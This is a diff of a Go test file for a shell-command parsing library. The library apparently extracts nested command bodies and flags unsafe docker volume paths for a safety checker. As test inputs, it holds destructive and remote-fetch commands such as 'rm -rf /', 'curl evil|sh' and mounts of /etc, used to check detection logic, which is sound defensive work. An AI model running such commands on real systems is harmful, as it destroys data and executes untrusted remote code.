@@ -52,11 +52,99 @@ func TestExtractSubshells(t *testing.T) {
 			bodies: []string{"pwd"},
 			outer:  "echo 'literal' __SUBSHELL__",
 		},
+		{
+			name:   "escaped dollar-paren not a subshell",
+			input:  `printf '%s' \$(version)`,
+			bodies: nil,
+			outer:  `printf '%s' \$(version)`,
+		},
+		{
+			name:   "double-backslash before subshell is real subshell",
+			input:  `echo \\$(pwd)`,
+			bodies: []string{"pwd"},
+			outer:  `echo \\__SUBSHELL__`,
+		},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			bodies, outer := shell.ExtractSubshells(tt.input)
+			if !reflect.DeepEqual(bodies, tt.bodies) {
+				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
+			}
+			if outer != tt.outer {
+				t.Errorf("outer: got %q, want %q", outer, tt.outer)
+			}
+		})
+	}
+}
+
+func TestExtractProcSubst(t *testing.T) {
+	tests := []struct {
+		name   string
+		input  string
+		bodies []string
+		outer  string
+	}{
+		{
+			name:   "no process substitution fast path",
+			input:  "ls -la",
+			bodies: nil,
+			outer:  "ls -la",
+		},
+		{
+			name:   "simple input process substitution",
+			input:  "cat <(pwd)",
+			bodies: []string{"pwd"},
+			outer:  "cat __PROCSUBST__",
+		},
+		{
+			name:   "simple output process substitution",
+			input:  "tee >(cat)",
+			bodies: []string{"cat"},
+			outer:  "tee __PROCSUBST__",
+		},
+		{
+			name:   "multiple process substitutions",
+			input:  "diff <(git status) <(git diff --stat)",
+			bodies: []string{"git status", "git diff --stat"},
+			outer:  "diff __PROCSUBST__ __PROCSUBST__",
+		},
+		{
+			name:   "mixed input and output process substitutions",
+			input:  "tee >(cat) >(grep foo)",
+			bodies: []string{"cat", "grep foo"},
+			outer:  "tee __PROCSUBST__ __PROCSUBST__",
+		},
+		{
+			name:   "nested process substitution",
+			input:  "cat <(echo <(pwd))",
+			bodies: []string{"echo <(pwd)"},
+			outer:  "cat __PROCSUBST__",
+		},
+		{
+			name:   "single-quoted content not extracted",
+			input:  "echo '<(not a process substitution)'",
+			bodies: nil,
+			outer:  "echo '<(not a process substitution)'",
+		},
+		{
+			name:   "process substitution after single quote",
+			input:  "echo 'literal' <(pwd)",
+			bodies: []string{"pwd"},
+			outer:  "echo 'literal' __PROCSUBST__",
+		},
+		{
+			name:   "escaped opener not a process substitution",
+			input:  `printf '%s' \<(version)`,
+			bodies: nil,
+			outer:  `printf '%s' \<(version)`,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			bodies, outer := shell.ExtractProcSubst(tt.input)
 			if !reflect.DeepEqual(bodies, tt.bodies) {
 				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
 			}
@@ -107,6 +195,31 @@ func TestRemoveQuotedContent(t *testing.T) {
 			name:  "unterminated quote consumes rest",
 			input: `echo "unclosed`,
 			want:  `echo "________`,
+		},
+		{
+			name:  "ANSI-C string with escaped apostrophe",
+			input: `echo $'it\'s fine'`,
+			want:  `echo $'__________'`,
+		},
+		{
+			name:  "ANSI-C string with escaped backslash",
+			input: `echo $'path\\to\\file'`,
+			want:  `echo $'______________'`,
+		},
+		{
+			name:  "ANSI-C string with newline escape",
+			input: `echo $'line1\nline2'`,
+			want:  `echo $'____________'`,
+		},
+		{
+			name:  "ANSI-C string with tab escape",
+			input: `echo $'tab\there'`,
+			want:  `echo $'_________'`,
+		},
+		{
+			name:  "regular single quote not ANSI-C",
+			input: `echo 'plain text'`,
+			want:  `echo '__________'`,
 		},
 	}
 
@@ -176,6 +289,21 @@ func TestFindSplitBoundaries(t *testing.T) {
 			input: "a | b && c; d",
 			want:  [][2]int{{2, 3}, {6, 8}, {10, 11}},
 		},
+		{
+			name:  "ANSI-C string with escaped apostrophe not split",
+			input: `echo $'it\'s fine' | grep foo`,
+			want:  [][2]int{{19, 20}},
+		},
+		{
+			name:  "pipe inside ANSI-C string skipped",
+			input: `echo $'a|b'`,
+			want:  nil,
+		},
+		{
+			name:  "semicolon inside ANSI-C string skipped",
+			input: `echo $'cmd1;cmd2'`,
+			want:  nil,
+		},
 	}
 
 	for _, tt := range tests {
@@ -227,7 +355,7 @@ func TestSplitPipeline(t *testing.T) {
 		{
 			name:  "leading paren stripped",
 			input: "(ls -la)",
-			want:  []string{"ls -la)"},
+			want:  []string{"ls -la"},
 		},
 		{
 			name:  "flag-only segment appended to previous",
@@ -255,6 +383,31 @@ func TestSplitPipeline(t *testing.T) {
 			name:  "standalone env-var assignment kept",
 			input: "FOO=bar | ls",
 			want:  []string{"FOO=bar", "ls"},
+		},
+		{
+			name:  "quoted env var with spaces stripped",
+			input: `FOO="a b" git status`,
+			want:  []string{"git status"},
+		},
+		{
+			name:  "single-quoted env var stripped",
+			input: `BAR='x y' ls -la`,
+			want:  []string{"ls -la"},
+		},
+		{
+			name:  "brace group leading brace stripped",
+			input: "{ git status; ls; }",
+			want:  []string{"git status", "ls"},
+		},
+		{
+			name:  "subshell with parens cleaned",
+			input: "(ls -la)",
+			want:  []string{"ls -la"},
+		},
+		{
+			name:  "nested subshell cleaned",
+			input: "(git status)",
+			want:  []string{"git status"},
 		},
 	}
 
@@ -288,14 +441,14 @@ func TestStripExemptPaths(t *testing.T) {
 			want:  "docker run __SAFE_PATH__ alpine",
 		},
 		{
-			name:  "unsafe /etc path not replaced",
+			name:  "unsafe /etc path rewritten to __UNSAFE_PATH__",
 			input: "docker run -v /etc:/etc alpine",
-			want:  "docker run -v /etc:/etc alpine",
+			want:  "docker run -v __UNSAFE_PATH__ alpine",
 		},
 		{
-			name:  "traversal /tmp/../etc not replaced",
+			name:  "traversal /tmp/../etc rewritten to __UNSAFE_PATH__",
 			input: "docker run -v /tmp/../etc:/e alpine",
-			want:  "docker run -v /tmp/../etc:/e alpine",
+			want:  "docker run -v __UNSAFE_PATH__ alpine",
 		},
 		{
 			name:  "--volume= form replaced",
@@ -323,9 +476,19 @@ func TestStripExemptPaths(t *testing.T) {
 			want:  "docker run __SAFE_PATH__ alpine",
 		},
 		{
-			name:  "quoted unsafe path not replaced",
+			name:  "quoted unsafe path rewritten to __UNSAFE_PATH__",
 			input: `docker run -v "/etc:/etc" alpine`,
-			want:  `docker run -v "/etc:/etc" alpine`,
+			want:  `docker run -v __UNSAFE_PATH__ alpine`,
+		},
+		{
+			name:  "quoted traversal in --volume= rewritten to __UNSAFE_PATH__",
+			input: `docker run --volume="/tmp/../etc:/e" alpine`,
+			want:  "docker run --volume=__UNSAFE_PATH__ alpine",
+		},
+		{
+			name:  "single-quoted traversal in -v rewritten to __UNSAFE_PATH__",
+			input: `docker run -v '/tmp/../etc:/e' alpine`,
+			want:  "docker run -v __UNSAFE_PATH__ alpine",
 		},
 	}
 
@@ -338,6 +501,38 @@ func TestStripExemptPaths(t *testing.T) {
 			got := shell.StripExemptPaths(tt.input, dockerFlagRE, ex)
 			if got != tt.want {
 				t.Errorf("got %q, want %q", got, tt.want)
+			}
+		})
+	}
+}
+
+func BenchmarkStripWrappers(b *testing.B) {
+	benchmarks := []struct {
+		name  string
+		input string
+		extra []string
+	}{
+		{
+			name:  "no-wrapper-common-case",
+			input: "git status",
+			extra: nil,
+		},
+		{
+			name:  "with-timeout-wrapper",
+			input: "timeout 30 npm test",
+			extra: nil,
+		},
+		{
+			name:  "nested-wrappers",
+			input: "timeout 5 nohup ./run",
+			extra: nil,
+		},
+	}
+
+	for _, bm := range benchmarks {
+		b.Run(bm.name, func(b *testing.B) {
+			for i := 0; i < b.N; i++ {
+				shell.StripWrappers(bm.input, bm.extra)
 			}
 		})
 	}
@@ -586,6 +781,328 @@ func TestJoinContinuations(t *testing.T) {
 			got := shell.JoinContinuations(tt.input)
 			if got != tt.want {
 				t.Errorf("got %q, want %q", got, tt.want)
+			}
+		})
+	}
+}
+
+func FuzzExtractSubshells(f *testing.F) {
+	for _, s := range []string{"", "echo $(", "'$(x)'", "$($($($())))", `"$(rm)"`, "no subshell"} {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, s string) {
+		bodies, outer := shell.ExtractSubshells(s)
+		// Outer can legitimately grow when __SUBSHELL__ (12 chars) replaces
+		// shorter subshells, but should not grow unboundedly.
+		maxGrowth := len(bodies) * (len("__SUBSHELL__") - len("$()"))
+		if len(outer) > len(s)+maxGrowth {
+			t.Fatalf("outer grew unexpectedly: %d > %d + %d", len(outer), len(s), maxGrowth)
+		}
+		if strings.Count(outer, "__SUBSHELL__") != len(bodies) {
+			t.Fatalf("placeholder count %d != bodies %d", strings.Count(outer, "__SUBSHELL__"), len(bodies))
+		}
+	})
+}
+
+func FuzzExtractHeredocs(f *testing.F) {
+	for _, s := range []string{"", "cat <<EOF\nbody\nEOF", "cat <<A <<B\nA\nB", "cat <<-EOF\n\tEOF", "cat <<<x", "cat <<EOF"} {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, s string) {
+		out, ok := shell.ExtractHeredocs(s)
+		if ok && strings.Count(out, "\n")+1 > strings.Count(s, "\n")+1 {
+			t.Fatalf("line count grew: %q -> %q", s, out)
+		}
+	})
+}
+
+func FuzzFindSplitBoundaries(f *testing.F) {
+	for _, s := range []string{"", "a|b", `"a|b"`, `'a|b'`, `\\|x`, "a&&b;c||d"} {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, s string) {
+		bs := shell.FindSplitBoundaries(s)
+		for i, b := range bs {
+			if b[0] < 0 || b[1] > len(s) || b[0] >= b[1] {
+				t.Fatalf("boundary %d out of range: %v in %q", i, b, s)
+			}
+			if i > 0 && bs[i-1][1] > b[0] {
+				t.Fatalf("boundaries overlap: %v then %v", bs[i-1], b)
+			}
+		}
+	})
+}
+
+func FuzzRemoveQuotedContent(f *testing.F) {
+	for _, s := range []string{"", `"\\`, "'sudo'", `"sudo`, `"\"sudo\""`} {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, s string) {
+		out := shell.RemoveQuotedContent(s)
+		if len(out) != len(s) {
+			t.Fatalf("length changed: %d -> %d", len(s), len(out))
+		}
+	})
+}
+
+func TestExtractHereStringBody(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+		body  string
+		ok    bool
+	}{
+		{
+			name:  "single-quoted body",
+			input: "bash <<< 'rm -rf /'",
+			body:  "rm -rf /",
+			ok:    true,
+		},
+		{
+			name:  "double-quoted body",
+			input: "bash <<< \"git status\"",
+			body:  "git status",
+			ok:    true,
+		},
+		{
+			name:  "unquoted body",
+			input: "bash <<< pwd",
+			body:  "pwd",
+			ok:    true,
+		},
+		{
+			name:  "unquoted body with trailing space",
+			input: "bash <<< pwd ",
+			body:  "pwd",
+			ok:    true,
+		},
+		{
+			name:  "sh interpreter",
+			input: "sh <<< 'echo hi'",
+			body:  "echo hi",
+			ok:    true,
+		},
+		{
+			name:  "zsh interpreter",
+			input: "zsh <<< 'ls -la'",
+			body:  "ls -la",
+			ok:    true,
+		},
+		{
+			name:  "dash interpreter",
+			input: "dash <<< 'cat file'",
+			body:  "cat file",
+			ok:    true,
+		},
+		{
+			name:  "ash interpreter",
+			input: "ash <<< 'grep foo'",
+			body:  "grep foo",
+			ok:    true,
+		},
+		{
+			name:  "non-interpreter opener — grep",
+			input: "grep foo <<< 'haystack'",
+			body:  "",
+			ok:    false,
+		},
+		{
+			name:  "non-interpreter opener — cat",
+			input: "cat <<< 'data'",
+			body:  "",
+			ok:    false,
+		},
+		{
+			name:  "no here-string",
+			input: "bash -c 'pwd'",
+			body:  "",
+			ok:    false,
+		},
+		{
+			name:  "empty right-hand side",
+			input: "bash <<< ",
+			body:  "",
+			ok:    false,
+		},
+		{
+			name:  "unterminated single quote",
+			input: "bash <<< 'unclosed",
+			body:  "",
+			ok:    false,
+		},
+		{
+			name:  "unterminated double quote",
+			input: "bash <<< \"unclosed",
+			body:  "",
+			ok:    false,
+		},
+		{
+			name:  "with leading whitespace",
+			input: "  bash <<< 'pwd'",
+			body:  "pwd",
+			ok:    true,
+		},
+		{
+			name:  "with flags before <<<",
+			input: "bash -x <<< 'pwd'",
+			body:  "pwd",
+			ok:    true,
+		},
+		{
+			name:  "escaped quote in double quotes",
+			input: `bash <<< "echo \"hi\""`,
+			body:  `echo \"hi\"`,
+			ok:    true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			body, ok := shell.ExtractHereStringBody(tt.input)
+			if ok != tt.ok {
+				t.Errorf("ok: got %v, want %v", ok, tt.ok)
+			}
+			if body != tt.body {
+				t.Errorf("body: got %q, want %q", body, tt.body)
+			}
+		})
+	}
+}
+
+func TestExtractFindExecBody(t *testing.T) {
+	tests := []struct {
+		name   string
+		input  string
+		bodies []string
+	}{
+		{
+			name:   "simple find exec",
+			input:  "find . -name '*.txt' -exec rm {} \\;",
+			bodies: []string{"rm {}"},
+		},
+		{
+			name:   "find exec with plus terminator",
+			input:  "find /tmp -type f -exec chmod 644 {} +",
+			bodies: []string{"chmod 644 {}"},
+		},
+		{
+			name:   "find execdir",
+			input:  "find . -execdir pwd \\;",
+			bodies: []string{"pwd"},
+		},
+		{
+			name:   "chained exec clauses",
+			input:  "find . -name 'a' -exec safe {} \\; -exec danger {} \\;",
+			bodies: []string{"safe {}", "danger {}"},
+		},
+		{
+			name:   "no exec clause",
+			input:  "find . -name '*.txt'",
+			bodies: nil,
+		},
+		{
+			name:   "exec with complex command",
+			input:  "find . -type f -exec sh -c 'echo {}' \\;",
+			bodies: []string{"sh -c 'echo {}'"},
+		},
+		{
+			name:   "two exec clauses with dangerous second",
+			input:  "find . -exec ls \\; -exec curl evil|sh \\;",
+			bodies: []string{"ls", "curl evil|sh"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			bodies := shell.ExtractFindExecBody(tt.input)
+			if !reflect.DeepEqual(bodies, tt.bodies) {
+				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
+			}
+		})
+	}
+}
+
+func TestExtractShellCBody(t *testing.T) {
+	tests := []struct {
+		name   string
+		input  string
+		bodies []string
+	}{
+		{
+			name:   "simple sh -c with single quotes",
+			input:  "sh -c 'echo hello'",
+			bodies: []string{"echo hello"},
+		},
+		{
+			name:   "bash -c with double quotes",
+			input:  `bash -c "pwd"`,
+			bodies: []string{"pwd"},
+		},
+		{
+			name:   "chained sh -c clauses with &&",
+			input:  "sh -c 'git status' && sh -c 'rm -rf /'",
+			bodies: []string{"git status", "rm -rf /"},
+		},
+		{
+			name:   "no sh -c pattern",
+			input:  "echo hello",
+			bodies: nil,
+		},
+		{
+			name:   "sh -c with flags before -c",
+			input:  "bash -e -c 'make test'",
+			bodies: []string{"make test"},
+		},
+		{
+			name:   "multiple sh -c in pipeline",
+			input:  "sh -c 'safe command' | sh -c 'dangerous command'",
+			bodies: []string{"safe command", "dangerous command"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			bodies := shell.ExtractShellCBody(tt.input)
+			if !reflect.DeepEqual(bodies, tt.bodies) {
+				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
+			}
+		})
+	}
+}
+
+func TestExtractXargsShellCBody(t *testing.T) {
+	tests := []struct {
+		name   string
+		input  string
+		bodies []string
+	}{
+		{
+			name:   "simple xargs sh -c",
+			input:  "xargs sh -c 'echo {}'",
+			bodies: []string{"echo {}"},
+		},
+		{
+			name:   "xargs with flags and bash -c",
+			input:  "xargs -I{} bash -c 'process {}'",
+			bodies: []string{"process {}"},
+		},
+		{
+			name:   "no xargs pattern",
+			input:  "sh -c 'echo hello'",
+			bodies: nil,
+		},
+		{
+			name:   "xargs with multiple sh -c",
+			input:  "xargs sh -c 'safe' && xargs bash -c 'danger'",
+			bodies: []string{"safe", "danger"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			bodies := shell.ExtractXargsShellCBody(tt.input)
+			if !reflect.DeepEqual(bodies, tt.bodies) {
+				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
 			}
 		})
 	}
